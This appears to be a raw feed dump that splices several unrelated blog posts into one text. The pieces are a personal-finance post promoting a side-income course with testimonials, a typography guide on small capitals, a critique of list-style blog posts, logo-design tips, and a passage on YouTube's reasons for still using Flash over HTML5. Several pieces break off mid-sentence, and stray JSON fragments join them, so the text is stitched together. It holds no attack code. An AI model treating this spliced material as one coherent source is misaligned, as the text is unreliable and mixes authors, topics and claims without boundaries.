as you cut back on spending, it gets increasingly harder, but as you earn more, it gets increasingly <em>easier</em>. For example, one of my students is earning several thousand dollars more per month. Let’s say he makes a small 10% tweak (say, a phrase he uses in his pricing negotiations, or the way he presents his guarantee, or even the customers he pursues). At his scale, that small tweak alone can be worth hundreds of dollars per month.</p>\n<p><strong>Cutting back on everything really sucks</strong>. Really, when you read some of these judgmental people who think it’s unconscionable to spend a little money on a nice dinner or trip or shirt…don’t you wonder, who really wants to live like that? Let’s assume you want an extra $1,000/month in your bank account. Let’s compare what you’d have to SAVE vs. what you’d have to EARN. </p>\n<ul>\n<li>Saving: No eating out, cancel gym, cancel cable, no going out, reduce cellphone minutes…etc. </li>\n<li>Earning more: Spend 4 weeks testing ideas rapidly (these could be anything you’re good at, including dog walking, organizing, writing, singing, high-school math, programming…), spend 4 more weeks developing your service offering, testing it in an iterative fashion, then identifying 50 leads, qualifying, and pitching them. If you get 1 client, you have $1,000/month. That’s about 5 hours/week. And the best part? As long as you continue doing a great job for your client, that money continues flowing in, and you can find more clients to compound your growth.</li>\n</ul>\n<p>The point is, if you can earn $50, you can earn $500. And if you can earn $500, you can earn $5,000. For those people who are willing to challenge themselves beyond the simple mantra of “cut back on everything,” there is a lush and rich life waiting for you — not just financially, but also intellectually, because knowing how to earn more money is a skill that applies to so many areas of your life.</p>\n<p><strong>Anyone can cut back for a few days. Few can persist. And even fewer can earn money on the side, which is a GOOD thing for you.</strong> How often have you gotten gung-ho about saving money, cut back 80% on your spending, then watched it float right back to what it was before? Anyone can make a short-term resolution, but it’s extraordinarily difficult to change behavior for the long term. Since we have limited willpower, I believe we should automate as many basic decisions as possible, and concentrate our limited cognition/willpower on more things like relationships, health, and our work. Also, since we have limited willpower, if you’re going to direct it to your finances, why not pick something that will result in a BIG WIN — something like earning more money? </p>\n<p>If you earned just $300/month for 5 years, that’s $18,000. My students know how they can easily earn that much and, since it’s such a modest number, how they can virtually automate that money.</p>\n<p>Think bigger. If you earned $1,000/month for 5 years, that’s $60,000. That assumes you don’t increase your income and that you earn more for just for 5 years. You see? When you earn more, it’s in your control — and the numbers are staggering. How many lattes is that worth?</p>\n<p><strong>Who wants to wait 40 years to live life?</strong> Not me. When you see people taking trips, or maxing out their Roth IRA, or spending consciously however they want…I don’t think to myself, “Waa…I can’t afford that.” I ask myself, “How could I afford that?” That simple shift in the form of the question has a profound effect on your ability to take action. </p>\n<p>I’ve heard a lot of people say something like, “Oh yeah, HE can earn more money on the side because [some reason], but *I* never could.” That is wrong. In fact, as you know I generally hate artists because they are the worst business people in the world. But look at this from one of my students: </p>\n<blockquote><p>“Thanks to you, I’m an artist that’s not starving. Your Earn1K course helped me successfully secure two new corporate accounts (Anthropologie and Takashimaya) in the last month.”<br>\n– Julie F.</p></blockquote>\n<p>My new motto is, if an artist can do it, so can you. </p>\n<p><strong>In general, people behave conservatively in times of ambiguity</strong>. So when faced with the ultra-ambigous idea of earning more, most people create barriers in their mind to justify why earning more is impossible. </p>\n<ul>\n<li> “How does so-and-so always get to go on those weekend trips / have flexibility / work from home? She’s so lucky”</li>\n<li>“But I’m a [fill in your job here]… I just CAN’T earn more on the side with my skill set.” &lt;--barriers you set for yourself that make you feel exceptional -- this stuff can&#39;t apply to me because I... [excuse goes here]</li>\n<li>“I’m just waiting for a good idea” &lt;--note the usage of &quot;waiting&quot; for an idea rather than &quot;actively seeking out an idea and testing it for profitability,&quot; a key concept I want to teach you</li></ul>\n<p>Now let me share some of the insights I’ve learned that might help you figure out what you could do to earn more money.</p>\n<h3>5 surprising insights on earning more money</h3>\n<p>Over the last 4 months, I’ve learned a huge amount from over 8,000 data points, including survey responses, individual emails, phone calls, in-person meetings, and webcasts. Here are 5 that stand out.</p>\n<ol>\n<li><strong>The #1 barrier to people earning more is finding an idea</strong>. Everyone loves the thought of earning $1,000+/month. But when you ask them how they might do it, they suddenly stop, confused about which idea might work — or even guilty that their idea could never be good enough to charge people for. I’ll go into this more over the next few weeks because there is a lot of interesting psychology going on here.</li>\n<li><strong>Next, there are several common reasons that people want to earn more</strong>. It’s not what you think, either. I initially believed it would be so people could buy a $800 coat or bottle service at a club; in other words, live a baller lifestyle. Not the case. Most people are simply unsatisfied with their job and want the option of eventually quitting and working for themselves, or simply having the option of doing SOMETHING else.\n<p>Do you guys know people who are a few years out of college and feel like, “Huh…is this it?” Shouldn’t we be meeting CEOs now? Flying around to dispense our wisdom? Seeing huge growth in our salaries, exotic travel, and new ways of thinking all the time? And when you realize it’s not happening — especially in those years between now and having kids — it becomes really disconcerting. What do you do? </p>\n<p>I have a college friend who I went to visit a few months ago. We were catching up on his dating life and he confessed that he was still not doing very well with women. I asked if he’d considered getting some dating advice or taking a course. (I know some people think this is weird, but I think of it as pure self-development.) He thought it was weird too, and he’s actively refused to get advice from anyone more successful with women — but his lack of a dating life was really bothering him. I said ok, and we got quiet for a while. Then I asked, “So you want X but it’s not working. Have you changed anything to get it?” And he looked at me, point-blank, and said, “No, I guess I haven’t.” </p>\n<p>Without changing any behaviors, how can you expect your results to change?\n<li><strong>Then I learned that more and more people want accountability and smart people around them</strong>. They actually openly say, “Yes, I need accountability. I start things but never finish them.” I was surprised to hear how honest people were. Another thing they point out is that often, nobody around them is really motivated to do anything, so they don’t have any support system. More key insights when it comes to earning money. If all your friends are satisfied working at the local insurance company, it becomes “weird” for you to do something different…and that simple social dynamic is enough to dissuade many people from trying something new. We tried to be very careful building in accountability and got comments like this from one of my students named Wendy L.: “This course is probably more valuable than my MBA.”\n<li><strong>Most importantly, I learned that earning more is NOT about tactic after tactic</strong>. I’ve been emphasizing that lately on iwillteachyoutuberich for the readers who are constantly clamoring for more and more new material. In truth, most of them haven’t actually implemented any of the old material, so they simply want new material as a sort of novelty drug, which will give them the illusory feeling of doing something and absolve them of actually having to take action. When it comes to earning money, mindset is also paramount. For example, people HATE calling others to ask or sell something. They just hate it. So even when we showed students that calling someone to get their input on an idea (not selling) would immensely help them earn more, people were extremely hesitant. They would ask for examples, scripts, and all kinds of other things so they wouldn’t have to call. But my most successful students overcame their natural tendency to avoid the phone, stretched themselves to build this new skill, and earned a TON of money on the side.\n<p>You know people like this: They have some kind of mental barrier and no matter what you suggest, they have an excuse ready to counter everything. I knew a guy in college who HATED going out. I’d say, “Well, what about this bar? What about this restaurant? Want to see a movie? What about go-kart racing dude.” And to each suggestion, he would have some kind of excuse. The problem was not the suggestion. The problem was a mental barrier. And by the way, yes, I realize it sounds like I was trying to date this guy.\n<li><strong>I learned that more than ever, systems are important</strong>. I can tell people the 75 things I did to earn more money, but unless it’s in a carefully constructed system that people can go through and understand which part affects the other parts, it’s pointless. Systems matter.  Here’s what one of my students said:<br>\n<blockquote><p>“Before [you helped me earn more money], I was wasting time shotgunning résumés, writing cover letters, making shitty portfolios, making robots from scratch, unsolicited engineering design analyses—anything and everything to get a new job.<br>\nI got zero responses.  I was an aimless, desperate mess.  I was so discouraged and embarrassed that I just played videogames all day.”<br>\n–Eugene Y.</p></blockquote>\n</li></p></li></li></p></li></ol>\n<p>Whether it’s earning more, automating your finances, or trying to lose weight, a system matters far more than simply trying harder. \n\n<h3>The 6-month check-in</h3>\n<p>At the beginning of this year, I told you that this was the year of earning more. </p>\n<p>And one of the insights I listed above was that we WANT someone to hold us accountable. It’s too easy to give up. It’s too easy to settle for doing the same old 9-5 job with a 50-year outlook on retirement. Fuck that. It never gets easier than now.</p>\n<p>Before you run a marathon, it seems impossible to do it. And novices fixate on tactics, like “which shoes should I wear?” But once you’ve completed a marathon, you’ve cracked the code and you realize it’s a mental game. You can do it again anytime if you want. If not, you don’t have to…but at least you know you can. Once you earn your first $500, then $1,000…you can stop there. But if you WANT to earn more…for the rest of your life, you know you can.</p>\n<p>So: Think back to New Year’s Day. January 1, 2010. What were your money resolutions? <strong>How much progress have you made?</strong></p>\n<p>Did you want to save more? Get in control of your finances? Learn new skills so you could give yourself the option of eventually quitting your job?</p>\n<p>Let this be a kick in the ass. I’m going to hold you accountable because I know we all need someone to do it.</p>\n<h3>3 stories about people who earned more</h3>\n<p>I just want to share these short excerpts with you.</p>\n<p>I like this one because it’s so quantitative and funnel-based. This removes all doubt that most people have about “Should I create a Twitter account? FB page? Maybe I should go to a conference…” More on how to do this later.</p>\n<blockquote><p>“In the first two weeks, after I pitched 229 people by email, I presented to 45 in person, booked 10 consults , took on 4 new clients (I’m 2 for 2 closing consults, 8 out of 10 are scheduled for the next two weeks and two people bought lesson packages directly w/out an additional consult) and have $679 on the books in new revenue as a result. My goal at the start of Earn1k was to get this up to a steady $2,000/mo in private lesson revenue, so with more leads in my funnel to follow up with, I’m feeling great about how this is going to grow.”<br>\n–Dan K.</p></blockquote>\n<p>This guy earned a $100/hour rate in 2 days. Imagine what his rate will be after he refines his pitch and customer research models.</p>\n<blockquote><p>“I wanted to tell you this story so you can pass it to the rest of your team at Earn1K. For the past 2 days I have sought out leads on service based business’s with really crappy craigslist ads. I emailed 20 of them each day with a short sales letter I wrote that basically offer them a free 30 min marketing consultation with me and no strings attached.</p>\n<p>I have had 4 people schedule the calls with me via email. During the calls I give them massive value, teaching them about moving the free line, free recorded messages, and finally I provide them with 3 things they can implement right away. I make no mention of my services or cost or anything.</p>\n<p>Each of them has then called me back the next day to ask me to work for them implementing my suggestions… without even asking for a cost! So I threw out $100/hr and they took it!</p>\n<p>I love this course man, thanks to you and your team for all your hard work, I am only into the sample material and module 1 and I have already landed 4 clients and I start working for them today at $100/hour. Thanks for everything, I will have made back my investement in 5 hours of work!”</p>\n<p>–Jordan R. </p></blockquote>\n<p>This guy earned $10,000:</p>\n<blockquote><p>“I’m not sure if you’re collecting success stories yet, but I have secured, as of this morning, better than $10,000 in side income over the next two months from one mega client, with prospects to continue with similar compensation. This is up from roughly $100 per month before. I have not only met my goal for the course, but met my goal for the remainder of the year! I owe this success in no small part to the Earn1k course. I think that once I invested my own money (and more than just $50 for a book), that added enough incentive to get off my ass and make things happen. A 2000% return on investment doesn’t seem too bad to me, either, especially considering the course is only about half over.”<br>\n–Ben D.</p></blockquote>\n<p>When I think about these stories, I want to look at myself in the mirror and lick my own countenance. Seriously, it is awesome to see people stretching and challenging themselves to crack the code of earning more. And now they know they can use those same skills to earn money FOREVER.</p>\n<h3>What’s coming next</h3>\n<p>I have 4 weeks of cool stuff on earning more coming your way. Case studies, hear from past Earn1k graduates, new techniques, and more. And remember that series on Friday Entrepreneurs I used to do? If you liked that, you’re gonna love what we’ve cooked up. </p>\n<p>NOTE: I’m not even linking to anything because I don’t want you to buy, sign up, click, read, or do anything. I just want you to start thinking about the difference between the same-old tips on cutting back, vs. how you could change your life by cracking the code of earning more money.</p>\n<h3>What you should do right now</h3>\n<p>We’re halfway through the year. The good news is you still have half a year to make a huge difference in 2010. Ask yourself, where do you want to be by the end of this year?</p>\n<p>Now, please answer these 3 questions to help get started:</p>\n<p>1. What are your barriers to earning more? (Think deeply…some barriers are buried, like “Only evil people earn money” or “I don’t deserve to earn more”)<br>\n2. Have you started to earn more in the past 6 months?<br>\n3. If not, what’s holding you back?</p>\n<p>Talk to you soon.</p>\n<img src=\"http://www.iwillteachyoutoberich.com/?ak_action=api_record_view&amp;id=5810&amp;type=feed\" alt=\"\"></p>"

      "content" : "<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//smallcaps-teaser.png\" alt=\"using small capitals in typography\" width=\"200\" height=\"160\">When a web page demands respect from readers, few type treatments give  it dignity like <strong>“small capitals.”</strong></p>\n<p>This treatment makes all letters in a  line of text uppercase, but retains hierarchy by making the initial  letters of important words noticeably larger.</p>\n<p>When used properly, small caps make things look stable and reliable.  They can appear official or solemn; stately text is never rushed.</p>\n<p>Small  caps march to their own deliberate beat. Small caps almost guarantee  that text won’t look cheap.</p>\n<p>Like any technique, though, this one can be  abused or used improperly. Read on for some tips on how to integrate the power of small caps in your designs…<span></span></p>\n<h1>Stroke Weight</h1>\n<p>Using small caps to set text isn’t as simple as it may sound. Large  letters must both denote the importance of words and draw attention to  the letters themselves. It’s a subtle problem, but if the rhythm breaks,  then the reader gets distracted. The most common culprit is varying  stroke weight: varying size creates inconsistent thickness in letters.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//stroke-weights-1.png\" alt=\"example of how making text smaller adds inconsistencies\"></p>\n<p>Adobe Garamond, the font, comes in regular, semi-bold and bold weights.  Although the first example above technically uses the same weight  throughout, it appears to have different weights because of changes in  text size. The solution is to use a semi-bold weight for all small  letters. Thickening the strokes is a nod to consistency; unfortunately,  it’s not a guaranteed solution.</p>\n<p><br></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//too-light.png\" alt=\"example of how making text smaller adds inconsistencies\"></p>\n<p>Myriad Pro comes in many variations. Its regular weight is too heavy  for the large letters above, but its light version is too light. Working  with both is possible, though:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//using-light.png\" alt=\"combinations of regular and light myriad pro\"></p>\n<p>Combining light and regular works for certain sizes. Because the small  letters are almost half the height of the large letters, regular with  regular (A) looks like a cheat, but light with regular (B) almost works.  If varying weights isn’t an option, then the best solution is to make  the small letters as large as possible. Slightly larger caps (C) look  good at the same weight, and you can still distinguish the important  initial letters. When the sizes are similar (D), mixing weights is  unnecessary.</p>\n<p>Matching weights is not a challenge overcome just by pushing buttons.</p>\n<p><br></p>\n<h1>Choosing Typefaces</h1>\n<p>Certain kinds of typefaces work better than others for small caps. The  degree of flow through a line of text varies with every typeface. For  example:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//typeface-variations-serif.png\" alt=\"demonstrating how serifs encourage text to flow horizontally\"></p>\n<p>The straight bars and serifs in Garamond cooperate to maintain a  horizontal flow. These built-in rules make the typeface ideal for  steady, determined small caps—the words practically form straight lines.</p>\n<p><br></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//typeface-variations-sans-serif.png\" alt=\"example of gaps in a sans-serif font\"></p>\n<p>Above, Futura’s geometry creates eye-snagging counters, so attention is  drawn to each large letter. The words flow less because the larger  small caps give us less of a horizontal line, but it still works.</p>\n<p><br></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//typeface-variations-script.png\" alt=\"scripts and small caps work as well as scripts and all caps, which  is not at all\"></p>\n<p>Script and handwriting typefaces rarely work with all caps or small  caps. Calligraphy, formal scripts and handwriting are optimized for  internal flow and rely on swoops rather than ruler-straight lines. If  your goal is a serious voice and your technique small caps, then a  handwritten typeface would work against that.</p>\n<p><br></p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//typeface-variations-monospaced.png\" alt=\"monospaced fonts do not make for good small caps\"></p>\n<p>Monospaced typefaces, by definition, work best at even sizes. Setting  Courier in small caps (as above) creates unnaturally weak small letters.  That’s acceptable if the goal is to emphasize the large letters: they  look almost like acronyms. Otherwise, uniform typefaces generally don’t  look good in mixed sizes.</p>\n<p>Some fonts—including Garamond, Didot, Gill Sans, Palatino, Trajan and  Minion—contain typefaces designed specifically for small caps. Use them  if they’re available; they’re better than the fake small caps generated  by layout or illustration software.</p>\n<p><br></p>\n<h1>Rhythm With Tracking</h1>\n<p>Rhythm is conveyed not by the letters themselves but by the space  around them. Adding space between characters can emphasize their natural  rhythm. Increased tracking—the spacing between characters in a  range—can draw out a phrase by slowing its “pace.”</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//tracking-example-1.png\" alt=\"example of visual rhythm with tracking and kerning\"></p>\n<p>The first line in the text above runs well with normal tracking. The  words are easy to read—maybe too easy: readers have no reason to take  notice. The second line sets the letters in staccato. Readers slow down.  Dignity does not hurry.</p>\n<p>Extra tracking should be used in moderation. How much is too much? Two  rules of thumb dictate when tracking has gone too far. First, too much  space turns words into isolated letters:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//tracking-variations.png\" alt=\"how different amounts of tracking affects small caps\"></p>\n<p>These few examples show how different amounts of tracking affect a line  of type. The ideal range is between 100% and 200%. When characters are  too far apart, the line of text ceases to look like a single unit. When  characters are set more than one character-width apart, people notice  the letters more than the words—especially if the text has more tracking  than leading.</p>\n<p>The second sign that tracking has gone too far is that it overpowers  the leading (the space between lines):</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//tracking-vs-leading.png\" alt=\"examples of leading and tracking together\"></p>\n<p>The examples above show how lines of text are affected by leading.  English is written in horizontal lines from left to right, so  distinguishing between lines is more of an issue than distinguishing  between words. When it comes to readability, leading trumps tracking.</p>\n<p><br></p>\n<h1>Choosing Words</h1>\n<p>Which words should have larger initials? It depends on which, if any,  are the most important.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//which-words-to-cap-1.png\" alt=\"variations on certain capitalized words\"></p>\n<p>In A, all letters are the same size. So, all words are of equal  importance.</p>\n<p>In B, all letters have a large initial. So, all words are still of  equal importance.</p>\n<p>In C, proper nouns and titles are enlarged. Short verbs (such as “is,”  “are” and “be”) and conjunctions (such as “or,” “and,” “not” and “but”)  are usually left small.</p>\n<p><br></p>\n<p>By recognizing that large letters designate importance, we can help  readers prioritize the words.</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//which-words-to-cap-2.png\" alt=\"more variations on certain capitalized words\"></p>\n<p>In D, the chairman is less important than the department.</p>\n<p>In E, human services is more important than health.</p>\n<p>In the case of F, where only the first word has a larger initial, we  have some ambiguity: the chairman might be more important, or the  initial might be larger just because it belongs to the first word.</p>\n<p>In general, the fewer the occurrences of large initials, the more  important those words seem. When every word has a large initial—as in  line B—none stand out. When a few words have large initials—as in line  E—readers assume it’s for a reason (even if they don’t know what it is).</p>\n<p>Small caps are universally recognized as carrying a serious tone:</p>\n<p><img src=\"http://netdna.webdesignerdepot.com/uploads/small_caps//woody-allen2.png\" alt=\"life is full of Misery, Loneliness and Suffering, and it’s all  over much too soon.

The typical case is when, after hours of calculations spent in the vain attempt of finding an interesting topic for your next post, you are miserably forced to lean on the safe long list to reenforce the visits to your site which dramatically decreased since your last post, dating back to a couple of days before.</p>\n<p>Just to be sure, a nice article with the “ten coolest fonts of the month” is always a hit destined to climb rapidly the top ten links of the day on Delicious, Reddit, StumbleUpon, Popurls and so on.</p>\n<p>A list of the 10 most interesting cheat sheets is by no means to be underestimated either. But since hundreds of lists like that are already around – they’re almost all the same except for the order in which the links appear – you will have to make an effort to find at least 20, 40, 60 (and multiples) fonts or cheat sheets to be more attractive on the market and make your list really memorable.</p>\n<p>This is a classic mechanism that triggers a vicious spiral of atrocities, designed to deliver a list made up of a disproportionate number of links on the topic of your choice. Eventually you will have something humongous, capable of competing with the Google index. And rest assured: it will undoubtedly be successful in terms of visits.</p>\n<p>If you’re lucky, you’ll also have the pleasure of tasting the bitter glory generated by the appearance of your beautiful mega list on Digg’s homepage. I say “bitter” because if you’re not well equipped, after 30 seconds, your site will collapse, miserably overwhelmed by a horde of visitors per second comparable to your average daily balance.</p>\n<p>And now, left on the table, a question: are those lists really useful in giving more value to a blog? To me, popularity and success of a blog are not measured only by the number of visits, but by the quality of content. That’s why I’d think twice. </p>\n<p>What about you? </p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/Woork?a=Y4bq-TbqRJM:rsP4SMbBm-c:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Woork?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Y4bq-TbqRJM:rsP4SMbBm-c:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Y4bq-TbqRJM:rsP4SMbBm-c:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Y4bq-TbqRJM:rsP4SMbBm-c:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Y4bq-TbqRJM:rsP4SMbBm-c:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Y4bq-TbqRJM:rsP4SMbBm-c:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Y4bq-TbqRJM:rsP4SMbBm-c:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Y4bq-TbqRJM:rsP4SMbBm-c:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Woork?d=qj6IDK7rITs\" border=\"0\"></a>\n</div>"

This is the Age of the Internet. And as we are well aware of the fact that its use has cut all the boundaries and now, everything in this world is accessible at a single click. For instance, if you running a business website and the site is accessed in a different place, far away from the native roots, at a different time and by an alien person. Then, who would be telling that person about your business, more importantly how would you create that one ever lasting impression. You cannot afford to “<em>wake up as a different person or identity</em>” for different people every time.</p><p>Then, who gives you this power of creating that that visual communication between the visitor and you, that serves as an extension of your business?<br> The answer is the LOGO of your company. <span></span></p><p>“<em>Identity is such a crucial affair that one should not rush into it.</em>”</p><p>And, a Logo, which symbolises one’s company provides a brand to your business. Its actually worth it when it deeply sticks to one’s mind and provides a facial identity to your business.</p><p>“<em>The value of Identity, of course, is that so often comes with a purpose.</em>”</p><p>And, by default, a logo should be designed in such a way that it serves your purpose. Websites, brochures, invoices, fax forms, social media, and almost everywhere, so that you represent a company or a brand of your own.</p><p>If we talk in a more structured and a technical way, a Logo is a graphical representation that embeds the characteristic feature of an organisation. Its actually a fusion of the creative, technical and entrepreneurial abilities on the part of a designer. There is no denying to the fact that visually, it is more than easy to retain something in our memory than just names. For instance, if you look on to Nike, or may be Adidas, Reebok, you immediately perceive them. There comes the uniqueness of your Logo, that stands above the rest. It acts as a trademark for a particular organisation, and people get to identify them.</p><p>I guess, now you would have been well aware of the importance of Logo in your business affair. And, you must be aware of this fact as well, that it won’t be quite simple to design the logo keeping all things in mind. They tend to make mistakes and, sometimes the end result worsens. It usually happens that the designer use the same fonts as used in rest of the website, wrong use of colours, may happen that the logo turns out to be too flashy, busy, and much detailed. There must be a possibility that it has no uniqueness of its own and, is very much similar to the the others.</p><p>“<em>One of the most wonderful things in Nature is a glance of the eye; it transcends speech, and it is the bodily symbol of identity.</em>”<br> And, I know that it would be right to say that the whole concept of having a Logo is more aptly based on this.</p><p>Based on the above lines, I would take this post as an opportunity to come up with a full-fledged important tips on Logo designing—</p><h3>On a technical front:</h3><p>Using Adobe Illustrator, or InkScape, CorelDRAW, Computer Graphics Metafile as a part of the vector software or in other words, object-based editing software does more than a good.</p><h3>Alternative:</h3><p>If you are not able to make it, then, make sure that your logo is quite big enough so that the quality is not lost while in JPEGs.</p><h3>Simplicity Rules:</h3><p>As in every designing rule book, simplicity is the rule that needs to be followed. On the similar lines, a logo needs to be as simple and unique as possible. Try not to use busy, and tacky fonts, too much vibrant colour scheme.</p><h3>Readable:</h3><p>“<em>Integrity does not means violating one’s identity.</em>”<br> Try and make it readable. If there is some text embedded in your logo, then, that ought to be clearer. People should be able to make out what you are trying to project.</p><h3>Quality Time:</h3><p>Try and spend quality time on working out for the Logo. Make sure that you try your hands on two or three sample and then, see what is the best that suits. Try and collect feedback for the same.</p><h3>Feedback:</h3><p>Feedback has always been an effective and interactive tool to be able to modify and make accurate changes. It is by far the most effective way to be able to come up with a good and a valuable design. There is no denying to the fact that it would help you come up with a crystal clear idea of what your logo actually lacks.</p><h3>Surf the Internet:</h3><p>Take a valuable stroll through the Internet and make sure that you make a research before you start up any design. Just make sure that you have a fair idea of what your logo would be and try and take an inspiration from the others as well.<br> Though, I do not intend to contradict my point of being unique, but any design can be unique even if it is inspired from some idea.</p><p>“<em>An identity would seem to be arrived at, by the way in which the person faces and uses his experience.</em>”</p><p>Same is the case with the designing of a Company’s Logo. Only after you are through with the company’s or a firm’s identity and what exactly it is about, and follow certain tips that have been mentioned above, you would be able to come up with a Logo that is actually the self-expression, and a part of being alive.</p><h3>Examples of Professional Logo Design</h3><p style=\"text-align:center\"><a href=\"http://brandmatto.com/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/1.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.logorado.com/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/2.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://logopond.com/members/profile/showcase/21778\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/3.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.bluescue.com/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/4.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.reklamipar.hu/actuart.html\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/5.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://logopond.com/members/profile/showcase/23220\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/6.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.mcguiredesign.com/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/7.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://brandstack.com/logos/details/8356\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/8.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.raykodesign.de/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/9.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://logopond.com/members/profile/showcase/17794\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/10.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://logopond.com/members/profile/showcase/20452\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/11.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.janzabransky.cz/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/12.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.bifoz.com/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/13.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.logomotive.net/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/14.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><p style=\"text-align:center\"><a href=\"http://www.eziedesigns.co.uk/\"><img title=\"1\" src=\"http://maxcdn.webappers.com/img/2010/06/15.jpg\" alt=\"1\" width=\"480\" height=\"200\"></a></p><h3>About the Author</h3><p>This post is shared by <a href=\"http://www.twitter.com/pixelcrayons\">PixelCrayons</a>, a creative web design and development agency that specializes in <a href=\"http://www.pixelcrayons.com\">custom web design &amp;

I would love to know why they felt like this was the right time, and what their angle is. I find myself often confused with the Google strategy. On one hand they are doing amazing things for the Open Web (Chrome, tools, Steve Souders and Web performance work), but on the other we see an alignment with Adobe and Flash (a differentiator to Apple).</p>\n<p>Man, I am torn. The pragmatist totally gets it. But the guy who realizes that it was the Web openness that allowed the likes of Google come from nothing to the powerhouse that it is today in a decade, gets confused.</p>\n<p>If you are a Flash fan you see this as \"see! Flash is here to stay!\" As someone who wants to see the Web standards get better fast, we see some of the momentum (fact that we have audio and video, and the WebM codec) and features that we need to get in:</p>\n<blockquote><p>\n<b>Robust video streaming</b></p>\n<p>Closely related to the need for a standard format is the need for an effective and reliable means of delivering the video to the browser. Simply pointing the browser at a URL is not good enough, as that doesn't allow users to easily get to the part of the video they want. As we’ve been expanding into serving full-length movies and live events, it also becomes important to have fine control over buffering and dynamic quality control. Flash Player addresses these needs by letting applications manage the downloading and playback of video via Actionscript in conjunction with either HTTP or the RTMP video streaming protocol. The HTML5 standard itself does not address video streaming protocols, but a number of vendors and organizations are working to improve the experience of delivering video over HTTP. We are beginning to contribute to these efforts and hope to see a single standard emerge.</p>\n<p><b>Content Protection</b></p>\n<p>YouTube doesn't own the videos that you watch - they're owned by their respective creators, who control how those videos are distributed through YouTube. For YouTube Rentals, video owners require us to use secure streaming technology, such as the Flash Platform's RTMPE protocol, to ensure their videos are not redistributed. Without content protection, we would not be able to offer videos like this.</p>\n<p><b>Encapsulation + Embedding</b></p>\n<p>Flash Player's ability to combine application code and resources into a secure, efficient package has been instrumental in allowing YouTube videos to be embedded in other web sites. Web site owners need to ensure that embedded content is not able to access private user information on the containing page, and we need to ensure that our video player logic travels with the video (for features like captions, annotations, and advertising). While HTML5 adds sandboxing and message-passing functionality, Flash is the only mechanism most web sites allow for embedded content from other sites.</p>\n<p><b>Fullscreen Video</b></p>\n<p>HD video begs to be watched in full screen, but that has not historically been possible with pure HTML. While most browsers have a fullscreen mode, they do not allow javascript to initiate it, nor do they allow a small part of the page (such as a video player) to fill the screen. Flash Player provides robust, secure controls for enabling hardware-accelerated fullscreen displays. While WebKit has recently taken some steps forward on fullscreen support, it's not yet sufficient for video usage (particularly the ability to continue displaying content on top of the video).</p>\n<p><b>Camera and Microphone access</b></p>\n<p>Video is not just a one-way medium. Every day, thousands of users record videos directly to YouTube from within their browser using webcams, which would not be possible without Flash technology. Camera access is also needed for features like video chat and live broadcasting - extremely important on mobile phones which practically all have a built-in camera. Flash Player has provided rich camera and microphone access for several years now, while HTML5 is just getting 